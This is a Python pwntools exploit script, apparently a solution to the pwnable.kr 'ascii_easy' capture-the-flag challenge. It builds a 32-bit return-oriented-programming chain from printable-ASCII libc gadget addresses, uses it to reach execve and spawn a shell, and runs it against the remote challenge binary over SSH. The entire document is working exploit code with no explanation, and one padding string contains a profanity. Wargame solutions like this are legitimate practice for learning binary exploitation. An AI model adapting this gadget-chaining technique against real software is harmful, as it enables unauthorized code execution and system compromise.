#!/usr/bin/python3
from pwn import *

BASE = 0x5555E000

# .text:000D8B69                 mov     ecx, [ebp-0x20]
# .text:000D8B6C                 mov     [esp+4], esi
# .text:000D8B70                 mov     [esp], edi
# .text:000D8B73                 mov     [esp+8], ecx
# .text:000D8B77                 call    execve
call_execve = BASE + 0x000D8b69

# 0x00174a51 : pop ecx ; add al, 0xa ; ret
rop_chain0 = BASE + 0x00174a51
# 0x0001706e : pop edi ; pop ebp ; ret
rop_chain1 = BASE + 0x0001706e
# 0x00179d39 : add edi, dword ptr [ecx + 0xe] ; add al, 0xc6 ; ret
rop_chain2 = BASE + 0x00179d39
# 0x00149729 : pop esi ; pop ebx ; ret
rop_chain3 = BASE + 0x00149729
# 0x0006812c  add esi, ebx ; ret
rop_chain4 = BASE + 0x0006812c
# 0x000f5122 : pop ebp ; ret
rop_chain5 = BASE + 0x000f5122


payload = b'a' * 0x20
payload += pack(rop_chain0, 32)
payload += pack(BASE + 0x17560 - 0xe, 32)
payload += pack(rop_chain1, 32)
payload += pack(0x556b2565, 32)
payload += b'fuck'
payload += pack(rop_chain2, 32)
payload += pack(rop_chain3, 32)
payload += pack(0x7d7d7d7e, 32)
payload += pack(0x41414141, 32)
payload += pack(rop_chain4, 32)
payload += pack(rop_chain4, 32)
payload += pack(rop_chain5, 32)
payload += pack(BASE + 0x17837 + 0x20, 32)
payload += pack(call_execve, 32)

s = ssh('ascii_easy', 'pwnable.kr', 2222, 'guest')
p = s.process(['./ascii_easy', payload.decode('ascii')])

p.interactive()